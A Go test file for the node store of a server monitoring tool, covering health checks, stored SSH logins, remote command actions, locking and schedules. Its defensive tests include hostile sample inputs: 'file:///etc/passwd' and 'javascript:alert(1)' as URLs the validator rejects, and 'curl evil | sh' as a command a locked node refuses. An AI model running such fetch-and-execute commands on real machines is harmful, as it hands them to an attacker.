package telemetry

import (
	"sort"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/hushkey-app/guard/internal/telemetry/model"
)

func TestNodeLifecycle(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "  VPS-1  ", URL: " https://vps-1.example.com/api/health ", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	// Trimmed, because a trailing space in a URL is a check that fails for a
	// reason nobody can see on screen.
	if node.Name != "VPS-1" || node.URL != "https://vps-1.example.com/api/health" {
		t.Fatalf("stored %q at %q", node.Name, node.URL)
	}
	if node.Status != model.StatusUnknown {
		t.Errorf("a node nobody has checked is %q, want unknown", node.Status)
	}

	node.Name = "VPS-1 (eu)"
	node.Enabled = false
	updated, err := store.SaveNode(node)
	if err != nil {
		t.Fatal(err)
	}
	if updated.Name != "VPS-1 (eu)" || updated.Enabled {
		t.Fatalf("update did not stick: %#v", updated)
	}

	if err := store.DeleteNode(node.ID); err != nil {
		t.Fatal(err)
	}
	if err := store.DeleteNode(node.ID); err == nil {
		t.Error("deleting a missing node reported success")
	}
}

// Guard fetches these URLs on a timer from inside whatever network it runs in.
// The allowlist is the whole safety story, so it is worth a test of its own.
func TestNodeURLValidation(t *testing.T) {
	for _, bad := range []string{
		"", "   ", "not-a-url", "/api/health", "//example.com/health",
		"file:///etc/passwd", "ftp://example.com", "gopher://example.com",
		"javascript:alert(1)", "http://", strings.Repeat("https://example.com/", 200),
	} {
		if err := model.ValidateNodeURL(bad); err == nil {
			t.Errorf("%q was accepted", bad)
		}
	}
	for _, good := range []string{
		"http://localhost:8000/api/health",
		"https://vps-1.example.com/health",
		"https://10.0.0.4:9000/",
	} {
		if err := model.ValidateNodeURL(good); err != nil {
			t.Errorf("%q was rejected: %v", good, err)
		}
	}
	if err := (Node{Name: "", URL: "https://example.com"}).Validate(); err == nil {
		t.Error("a node with no name was accepted")
	}
}

func TestChecksDriveStatusAndUptime(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })
	node, err := store.SaveNode(Node{Name: "VPS-1", URL: "https://example.com/health", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}

	now := time.Now().UTC()
	checks := []Check{
		{OK: true, StatusCode: 200, LatencyMS: 12, CheckedAt: now.Add(-3 * time.Minute)},
		{OK: false, StatusCode: 502, LatencyMS: 30, Error: "502 Bad Gateway", CheckedAt: now.Add(-2 * time.Minute)},
		{OK: true, StatusCode: 200, LatencyMS: 9, CheckedAt: now.Add(-time.Minute)},
		{OK: true, StatusCode: 200, LatencyMS: 11, CheckedAt: now},
	}
	for _, check := range checks {
		if err := store.RecordCheck(node.ID, check); err != nil {
			t.Fatal(err)
		}
	}

	read, err := store.Node(node.ID)
	if err != nil {
		t.Fatal(err)
	}
	// The latest check decides the status, not the majority.
	if read.Status != model.StatusUp || read.StatusCode != 200 || read.LatencyMS != 11 {
		t.Fatalf("status = %#v", read)
	}
	if read.Checks != 4 || read.Uptime != 75 {
		t.Fatalf("uptime = %.1f%% over %d checks, want 75%% over 4", read.Uptime, read.Checks)
	}
	// Oldest first: the strip is read left to right like everything else.
	if len(read.History) != 4 || read.History[0] != 1 || read.History[1] != 0 {
		t.Fatalf("history = %v", read.History)
	}
	// A failing check keeps its reason, or the dashboard says "down" and
	// nothing else.
	store.RecordCheck(node.ID, Check{OK: false, Error: "connection refused — nothing is listening", CheckedAt: now.Add(time.Minute)}) //nolint:errcheck
	read, _ = store.Node(node.ID)
	if read.Status != model.StatusDown || !strings.Contains(read.Error, "refused") {
		t.Fatalf("down node = %#v", read)
	}
}

// Checks are meaningless without the node they were of, and rows nothing can
// read are rows that only grow.
func TestDeletingANodeForgetsItsChecks(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })
	node, _ := store.SaveNode(Node{Name: "VPS-1", URL: "https://example.com/health", Enabled: true})
	for range 5 {
		store.RecordCheck(node.ID, Check{OK: true, StatusCode: 200}) //nolint:errcheck
	}
	if err := store.DeleteNode(node.ID); err != nil {
		t.Fatal(err)
	}
	var left int
	if err := store.db.QueryRow(`SELECT COUNT(*) FROM cluster_checks WHERE node_id = ?`, node.ID).Scan(&left); err != nil {
		t.Fatal(err)
	}
	if left != 0 {
		t.Errorf("%d checks outlived their node", left)
	}
}

// The cadence is per node: a load balancer worth watching every three seconds
// and a nightly batch box worth watching every five minutes live in the same
// cluster, and one global interval has to be wrong for one of them.
func TestNodeIntervals(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	fast, err := store.SaveNode(Node{Name: "lb", URL: "https://example.com/health", Enabled: true, IntervalSeconds: 3})
	if err != nil {
		t.Fatal(err)
	}
	slow, err := store.SaveNode(Node{Name: "batch", URL: "https://example.com/batch", Enabled: true, IntervalSeconds: 300})
	if err != nil {
		t.Fatal(err)
	}
	// Unset means the default, not zero — an unbounded loop against someone's
	// production endpoint is not a reasonable reading of a blank field.
	plain, err := store.SaveNode(Node{Name: "default", URL: "https://example.com/x", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	if fast.IntervalSeconds != 3 || slow.IntervalSeconds != 300 || plain.IntervalSeconds != model.DefaultIntervalSeconds {
		t.Fatalf("intervals = %d, %d, %d", fast.IntervalSeconds, slow.IntervalSeconds, plain.IntervalSeconds)
	}
	if plain.Interval() != 3*time.Second {
		t.Errorf("default interval = %s", plain.Interval())
	}

	slow.IntervalSeconds = 60
	updated, err := store.SaveNode(slow)
	if err != nil || updated.IntervalSeconds != 60 {
		t.Fatalf("edit = %d, %v", updated.IntervalSeconds, err)
	}

	for _, bad := range []int{-5, 0x7fffffff, 3601} {
		if err := (Node{Name: "x", URL: "https://example.com", IntervalSeconds: bad}).Validate(); err == nil {
			t.Errorf("interval %d was accepted", bad)
		}
	}
}

// The scheduler reads only what it needs to decide what is due.
func TestNodesForProbeCarriesCadenceAndLastCheck(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })
	watched, _ := store.SaveNode(Node{Name: "watched", URL: "https://example.com/a", Enabled: true, IntervalSeconds: 15})
	store.SaveNode(Node{Name: "paused", URL: "https://example.com/b", Enabled: false}) //nolint:errcheck
	checkedAt := time.Now().UTC().Add(-time.Minute)
	store.RecordCheck(watched.ID, Check{OK: true, StatusCode: 200, CheckedAt: checkedAt}) //nolint:errcheck

	due, err := store.NodesForProbe()
	if err != nil {
		t.Fatal(err)
	}
	if len(due) != 1 {
		t.Fatalf("%d nodes to probe, want only the enabled one", len(due))
	}
	if due[0].IntervalSeconds != 15 {
		t.Errorf("interval = %d", due[0].IntervalSeconds)
	}
	if due[0].CheckedAt.Unix() != checkedAt.Unix() {
		t.Errorf("last check = %s, want %s", due[0].CheckedAt, checkedAt)
	}
}

// Filtering by machine rather than by service is what makes the filter follow
// the cluster: pin a new service to a node and every "node 3" query includes
// it, without anyone editing a list of names.
func TestFilterByClusterNodes(t *testing.T) {
	store := NewStore(1000)
	t.Cleanup(func() { store.Close() })
	one, _ := store.SaveNode(Node{Name: "VPS-1", URL: "http://vps-1:8000/health", Enabled: true})
	two, _ := store.SaveNode(Node{Name: "VPS-2", URL: "http://vps-2:8000/health", Enabled: true})

	now := time.Now().UTC()
	add := func(service, instance string, attributes map[string]any) {
		if err := store.Add(Event{Signal: "logs", Service: service, Instance: instance, Message: service,
			Timestamp: now, Attributes: attributes}); err != nil {
			t.Fatal(err)
		}
	}
	add("web", "web-1", map[string]any{"url.full": "http://vps-1:8000/x"})
	add("api", "api-1", map[string]any{"url.full": "http://vps-2:8000/x"})
	add("worker", "worker-1", map[string]any{"queue.name": "emails"})

	services := func(f Filter) []string {
		events, err := store.Query(f)
		if err != nil {
			t.Fatal(err)
		}
		var out []string
		for _, event := range events {
			out = append(out, event.Service)
		}
		sort.Strings(out)
		return out
	}

	if got := services(Filter{Nodes: itoa(one.ID)}); len(got) != 1 || got[0] != "web" {
		t.Errorf("one machine = %v, want [web]", got)
	}
	// More than one is the useful case.
	if got := services(Filter{Nodes: itoa(one.ID) + "," + itoa(two.ID)}); len(got) != 2 {
		t.Errorf("two machines = %v, want web and api", got)
	}
	// No filter is everything, including what no machine covers.
	if got := services(Filter{}); len(got) != 3 {
		t.Errorf("no filter = %v, want all three", got)
	}
	// Pinning brings the worker along without the query changing.
	if err := store.AssignInstance("worker", "worker-1", one.ID); err != nil {
		t.Fatal(err)
	}
	if got := services(Filter{Nodes: itoa(one.ID)}); len(got) != 2 {
		t.Errorf("after pinning = %v, want web and worker", got)
	}
}

// A machine that exists but has reported nothing matches nothing. Matching
// everything would be the opposite of what was asked for.
func TestFilterByAnEmptyClusterNode(t *testing.T) {
	store := NewStore(1000)
	t.Cleanup(func() { store.Close() })
	node, _ := store.SaveNode(Node{Name: "VPS-1", URL: "http://vps-1:8000/health", Enabled: true})
	if err := store.Add(Event{Signal: "logs", Service: "web", Message: "hello", Timestamp: time.Now().UTC()}); err != nil {
		t.Fatal(err)
	}
	events, err := store.Query(Filter{Nodes: itoa(node.ID)})
	if err != nil {
		t.Fatal(err)
	}
	if len(events) != 0 {
		t.Fatalf("%d events for a machine nothing reports from", len(events))
	}
}

func TestFilterRejectsNonsenseNodes(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })
	if _, err := store.Query(Filter{Nodes: "1,two"}); err == nil {
		t.Error("a non-numeric node id was accepted")
	}
	// Blanks and trailing commas are the shape a URL actually arrives in.
	if _, err := store.Query(Filter{Nodes: " , "}); err != nil {
		t.Errorf("an empty list was rejected: %v", err)
	}
}

func itoa(id int64) string { return strconv.FormatInt(id, 10) }

func TestClusterSummary(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })
	up, _ := store.SaveNode(Node{Name: "A-up", URL: "https://example.com/a", Enabled: true})
	down, _ := store.SaveNode(Node{Name: "B-down", URL: "https://example.com/b", Enabled: true})
	store.SaveNode(Node{Name: "C-new", URL: "https://example.com/c", Enabled: true}) //nolint:errcheck
	store.RecordCheck(up.ID, Check{OK: true, StatusCode: 200})                       //nolint:errcheck
	store.RecordCheck(down.ID, Check{OK: false, Error: "timed out"})                 //nolint:errcheck

	summary, err := store.ClusterSummary()
	if err != nil {
		t.Fatal(err)
	}
	if summary.Nodes != 3 || summary.Up != 1 || summary.Down != 1 || summary.Unknown != 1 {
		t.Fatalf("summary = %#v", summary)
	}
	if summary.Worst != "B-down" {
		t.Errorf("worst = %q, want the failing node", summary.Worst)
	}
}

func TestNodeAddressesComposeTheProbeURL(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	// The health path hangs off the address the service answers on. The SSH
	// host is a way in, not a health check, and must not attract the path.
	node, err := store.SaveNode(Node{
		Name: "VPS-1", Domain: "http://localhost:8000", HealthPath: "/api/health",
		SSHAddress: "root@10.10.182.113", Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	if node.URL != "http://localhost:8000/api/health" {
		t.Fatalf("probing %q, want the address with the health path", node.URL)
	}

	node.Domain = "https://vps-1.example.com"
	public, err := store.SaveNode(node)
	if err != nil {
		t.Fatal(err)
	}
	if public.URL != "https://vps-1.example.com/api/health" {
		t.Fatalf("probing %q, want the new address with the same health path", public.URL)
	}

	// A machine stored before the split keeps being probed where it was.
	legacy, err := store.SaveNode(Node{
		Name: "VPS-0", InternalURL: "http://10.10.10.10:8000", HealthPath: "/healthz", Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	if legacy.URL != "http://10.10.10.10:8000/healthz" {
		t.Fatalf("probing %q, want the old internal address", legacy.URL)
	}

	if _, err := store.SaveNode(Node{Name: "nowhere", Enabled: true}); err == nil {
		t.Error("a machine with no address at all was accepted")
	}
	if _, err := store.SaveNode(Node{Name: "bad path", Domain: "https://x.example.com", HealthPath: "api/health"}); err == nil {
		t.Error("a health path that is not a path was accepted")
	}
	if _, err := store.SaveNode(Node{Name: "bad ssh", Domain: "https://x.example.com", SSHAddress: "10.10.10.10"}); err == nil {
		t.Error("an ssh address with no user was accepted")
	}
}

func TestPasswordIsSealedAndNeverRead(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	password := "hunter2"
	node, err := store.SaveNode(Node{
		Name: "VPS-1", InternalURL: "http://10.10.10.10:8000",
		SSHAddress: "root@10.10.10.10", Password: &password, Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !node.HasPassword {
		t.Fatal("a machine given a password does not say it has one")
	}
	// The read path says a password exists and cannot carry it.
	if node.Password != nil {
		t.Error("the password came back out of the store")
	}

	login, err := store.SSHLoginFor(node.ID)
	if err != nil {
		t.Fatal(err)
	}
	if login.User != "root" || login.Address != "10.10.10.10:22" || login.Password != password {
		t.Fatalf("login is %+v", login)
	}

	// An edit that says nothing about the password keeps it.
	node.Name = "VPS-1 (eu)"
	kept, err := store.SaveNode(node)
	if err != nil {
		t.Fatal(err)
	}
	if !kept.HasPassword {
		t.Error("renaming a machine lost its password")
	}

	// An empty one forgets it, which is a different request from silence.
	empty := ""
	kept.Password = &empty
	cleared, err := store.SaveNode(kept)
	if err != nil {
		t.Fatal(err)
	}
	if cleared.HasPassword {
		t.Error("the password was not forgotten")
	}
}

func TestActionsAreEditedAsAList(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "VPS-1", InternalURL: "http://10.10.10.10:8000", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	saved, err := store.SaveActions(node.ID, []model.NodeAction{
		{Name: "Reboot", Command: "sudo reboot"},
		{Name: "Update", Command: "apt-get update && apt-get upgrade -y"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(saved) != 2 || saved[0].Name != "Reboot" {
		t.Fatalf("saved %+v", saved)
	}

	// Running one is remembered on it, so a button can say how it went.
	if err := store.RecordRun(saved[0].ID, model.Run{ExitCode: 1, RanAt: time.Now().UTC()}); err != nil {
		t.Fatal(err)
	}
	// Editing by id keeps that record; the alternative — rewriting the list
	// wholesale — would forget it on every keystroke that reaches the server.
	edited, err := store.SaveActions(node.ID, []model.NodeAction{
		{ID: saved[0].ID, Name: "Reboot", Command: "sudo reboot now"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(edited) != 1 || edited[0].Command != "sudo reboot now" {
		t.Fatalf("edited %+v", edited)
	}
	if edited[0].LastExit != 1 || edited[0].LastError == "" {
		t.Errorf("editing an action forgot how it last ran: %+v", edited[0])
	}

	if _, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "", Command: "true"}}); err == nil {
		t.Error("an action with no name was accepted")
	}

	// The node carries them, so the settings page reads a cluster in one go.
	reread, err := store.Node(node.ID)
	if err != nil {
		t.Fatal(err)
	}
	if len(reread.Actions) != 1 {
		t.Fatalf("node carries %d actions", len(reread.Actions))
	}
}

func TestLockingFinishesTheCommandList(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	password := "hunter2"
	node, err := store.SaveNode(Node{
		Name: "VPS-1", Domain: "https://vps-1.example.com",
		SSHAddress: "root@10.10.10.10", Password: &password, Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	actions, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "Reboot", Command: "sudo reboot"}})
	if err != nil {
		t.Fatal(err)
	}

	node.Locked = true
	locked, err := store.SaveNode(node)
	if err != nil {
		t.Fatal(err)
	}
	if !locked.Locked {
		t.Fatal("the machine did not lock")
	}

	// The whole list is finished: not added to, not edited, not removed. The
	// add is the one that matters — it is enough to get any command at all onto
	// somebody's machine.
	for name, list := range map[string][]model.NodeAction{
		"an extra action":  {{ID: actions[0].ID, Name: "Reboot", Command: "sudo reboot"}, {Name: "Sneaky", Command: "curl evil | sh"}},
		"an edited action": {{ID: actions[0].ID, Name: "Reboot", Command: "curl evil | sh"}},
		"a removal":        {},
	} {
		if _, err := store.SaveActions(node.ID, list); err == nil {
			t.Errorf("a locked machine accepted %s", name)
		}
	}

	// The login is frozen with it.
	moved := locked
	moved.SSHAddress = "root@10.10.10.11"
	if _, err := store.SaveNode(moved); err == nil {
		t.Error("a locked machine let its ssh address be changed")
	}
	other := "letmein"
	changed := locked
	changed.Password = &other
	if _, err := store.SaveNode(changed); err == nil {
		t.Error("a locked machine let its password be changed")
	}

	// One way, from anywhere. The only way past it is deleting the machine.
	unlocking := locked
	unlocking.Locked = false
	still, err := store.SaveNode(unlocking)
	if err != nil {
		t.Fatal(err)
	}
	if !still.Locked {
		t.Error("the lock came off")
	}

	// Renaming, repathing and pausing still work: none of them can run
	// anything, and the commands that exist can still be run.
	renamed := still
	renamed.Name, renamed.Enabled, renamed.HealthPath = "VPS-1 (eu)", false, "/healthz"
	if _, err := store.SaveNode(renamed); err != nil {
		t.Errorf("a locked machine could not be renamed: %v", err)
	}
	if err := store.DeleteNode(node.ID); err != nil {
		t.Errorf("a locked machine could not be deleted: %v", err)
	}
}

func TestDuplicateCopiesTheShapeAndNotTheLogin(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	password := "hunter2"
	node, err := store.SaveNode(Node{
		Name: "VPS-1", Domain: "https://vps-1.example.com", HealthPath: "/api/health",
		SSHAddress: "root@10.10.10.10", Password: &password,
		IntervalSeconds: 30, Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	stored, err := store.SaveActions(node.ID, []model.NodeAction{
		{Name: "Reboot", Command: "sudo reboot"},
		{Name: "Update", Command: "apt-get update && apt-get upgrade -y"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := store.RecordRun(stored[0].ID, model.Run{ExitCode: 0, RanAt: time.Now().UTC()}); err != nil {
		t.Fatal(err)
	}
	// Locked last, the way it happens: configure the machine, then close it.
	node.Locked = true
	if _, err := store.SaveNode(node); err != nil {
		t.Fatal(err)
	}

	copied, err := store.DuplicateNode(node.ID)
	if err != nil {
		t.Fatal(err)
	}
	if copied.Name != "VPS-1 copy" {
		t.Errorf("copy is called %q", copied.Name)
	}
	if copied.Domain != node.Domain || copied.HealthPath != node.HealthPath || copied.IntervalSeconds != 30 {
		t.Errorf("the shape did not come across: %#v", copied)
	}
	if len(copied.Actions) != 2 || copied.Actions[1].Command != "apt-get update && apt-get upgrade -y" {
		t.Fatalf("actions are %+v", copied.Actions)
	}
	if copied.Actions[0].ID == stored[0].ID {
		t.Error("the copy shares its action rows with the original")
	}
	// A login proved against one box proves nothing about another, and the copy
	// has never run anything.
	if copied.SSHAddress != "" || copied.HasPassword {
		t.Errorf("the login was copied: %q has_password=%v", copied.SSHAddress, copied.HasPassword)
	}
	if copied.Locked {
		t.Error("the copy arrived locked")
	}
	if copied.Enabled {
		t.Error("the copy arrived checking the machine it was copied from")
	}
	if !copied.Actions[0].LastRunAt.IsZero() {
		t.Error("the copy claims to have run something")
	}

	// A second press does not collide.
	again, err := store.DuplicateNode(node.ID)
	if err != nil {
		t.Fatal(err)
	}
	if again.Name != "VPS-1 copy 2" {
		t.Errorf("the second copy is called %q", again.Name)
	}
}

func TestSchedulesAndRunHistory(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	saved, err := store.SaveActions(node.ID, []model.NodeAction{
		{Name: "Dump to R2", Command: "pg_dump ... | rclone rcat r2:backups/db.sql.gz",
			Schedule: "0 */6 * * *", StaleAfterSeconds: int((7 * time.Hour).Seconds())},
	})
	if err != nil {
		t.Fatal(err)
	}
	action := saved[0]
	if action.Schedule != "0 */6 * * *" || action.StaleAfterSeconds == 0 {
		t.Fatalf("saved %+v", action)
	}
	if action.NextRunAt.IsZero() || !action.NextRunAt.After(time.Now()) {
		t.Fatalf("next run = %s, want a time ahead", action.NextRunAt)
	}
	if action.CreatedAt.IsZero() {
		t.Fatal("an action with a staleness budget needs an anchor for having never succeeded")
	}

	// A run that failed: remembered on the action, and in the history.
	failed := model.Run{
		Command: action.Command, ExitCode: 1, RanAt: time.Now().UTC(),
		Trigger: model.TriggerSchedule, Output: "connection refused",
	}
	if err := store.RecordRun(action.ID, failed); err != nil {
		t.Fatal(err)
	}
	reread, err := store.Action(action.ID)
	if err != nil {
		t.Fatal(err)
	}
	if reread.LastExit != 1 || !reread.LastOKAt.IsZero() {
		t.Fatalf("a failure is not a success: %+v", reread)
	}

	// A success moves the separate last-success mark, which is what the
	// staleness watch reads.
	if err := store.RecordRun(action.ID, model.Run{RanAt: time.Now().UTC(), Trigger: model.TriggerSchedule}); err != nil {
		t.Fatal(err)
	}
	reread, err = store.Action(action.ID)
	if err != nil {
		t.Fatal(err)
	}
	if reread.LastOKAt.IsZero() {
		t.Fatal("a successful run was not remembered as one")
	}

	runs, err := store.Runs(node.ID, 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(runs) != 2 {
		t.Fatalf("history has %d rows, want both runs", len(runs))
	}
	// Newest first, and each row knows what it was.
	if runs[0].Result() != model.OutcomeOK || runs[1].Result() != model.OutcomeFailed {
		t.Fatalf("history = %+v", runs)
	}
	if runs[0].ActionName != "Dump to R2" || runs[0].Trigger != model.TriggerSchedule {
		t.Fatalf("history row = %+v", runs[0])
	}
}

func TestAScheduledActionIsReadBackByTheScheduler(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := store.SaveActions(node.ID, []model.NodeAction{
		{Name: "Dump", Command: "pg_dump", Schedule: "@every 6h"},
		{Name: "Reboot", Command: "sudo reboot"},
	}); err != nil {
		t.Fatal(err)
	}
	scheduled, err := store.ScheduledActions()
	if err != nil {
		t.Fatal(err)
	}
	if len(scheduled) != 1 || scheduled[0].Name != "Dump" {
		t.Fatalf("scheduled = %+v, want only the one carrying a schedule", scheduled)
	}

	// Pausing the machine stops its schedules, the same switch that stops its
	// health checks: a box being worked on is the last one that should have a
	// backup job opening sessions into it.
	if _, err := store.SaveNode(Node{ID: node.ID, Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: false}); err != nil {
		t.Fatal(err)
	}
	scheduled, err = store.ScheduledActions()
	if err != nil {
		t.Fatal(err)
	}
	if len(scheduled) != 0 {
		t.Fatalf("a paused machine still scheduled %d commands", len(scheduled))
	}
}

func TestASkippedRunIsRecordedWithoutBecomingTheLastRun(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	saved, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "Dump", Command: "pg_dump", Schedule: "@every 6h"}})
	if err != nil {
		t.Fatal(err)
	}
	action := saved[0]
	if err := store.RecordRun(action.ID, model.Run{
		RanAt: time.Now().UTC(), Trigger: model.TriggerSchedule,
		Outcome: model.OutcomeSkipped, Error: "the previous run was still going",
	}); err != nil {
		t.Fatal(err)
	}
	reread, err := store.Action(action.ID)
	if err != nil {
		t.Fatal(err)
	}
	// A skip never happened: letting it stand as the last run would push the
	// next fire a whole period away, which is the opposite of what a job that
	// is running long needs.
	if !reread.LastRunAt.IsZero() {
		t.Fatalf("a skipped run became the last run: %s", reread.LastRunAt)
	}
	runs, err := store.Runs(0, action.ID, 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(runs) != 1 || runs[0].Outcome != model.OutcomeSkipped {
		t.Fatalf("history = %+v, want the skip on the record", runs)
	}
}

func TestRunHistoryIsKeptToASize(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	saved, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "Dump", Command: "pg_dump"}})
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < runRetention+10; i++ {
		if err := store.RecordRun(saved[0].ID, model.Run{RanAt: time.Now().UTC(), Trigger: model.TriggerSchedule}); err != nil {
			t.Fatal(err)
		}
	}
	runs, err := store.Runs(0, saved[0].ID, 200)
	if err != nil {
		t.Fatal(err)
	}
	if len(runs) != runRetention {
		t.Fatalf("history kept %d rows, want %d", len(runs), runRetention)
	}

	// And removing the command takes its history with it: rows nothing can
	// read are rows nobody asked to keep.
	if _, err := store.SaveActions(node.ID, nil); err != nil {
		t.Fatal(err)
	}
	runs, err = store.Runs(node.ID, 0, 200)
	if err != nil {
		t.Fatal(err)
	}
	if len(runs) != 0 {
		t.Fatalf("history outlived its command: %d rows", len(runs))
	}
}

func TestAlertFlagClearsOnTheNextSuccess(t *testing.T) {
	store := NewStore(100)
	t.Cleanup(func() { store.Close() })

	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	saved, err := store.SaveActions(node.ID, []model.NodeAction{
		{Name: "Dump", Command: "pg_dump", StaleAfterSeconds: 3600},
	})
	if err != nil {
		t.Fatal(err)
	}
	watched, err := store.WatchedActions()
	if err != nil {
		t.Fatal(err)
	}
	if len(watched) != 1 {
		t.Fatalf("watched %d actions, want the one with a threshold", len(watched))
	}
	if err := store.MarkAlerted(saved[0].ID, time.Now()); err != nil {
		t.Fatal(err)
	}
	reread, err := store.Action(saved[0].ID)
	if err != nil {
		t.Fatal(err)
	}
	if reread.AlertedAt.IsZero() {
		t.Fatal("the alert was not recorded")
	}
	// A job that comes back should be able to alert again the next time it
	// goes away.
	if err := store.RecordRun(saved[0].ID, model.Run{RanAt: time.Now().UTC()}); err != nil {
		t.Fatal(err)
	}
	reread, err = store.Action(saved[0].ID)
	if err != nil {
		t.Fatal(err)
	}
	if !reread.AlertedAt.IsZero() {
		t.Fatal("a success left the alert flag standing")
	}
}
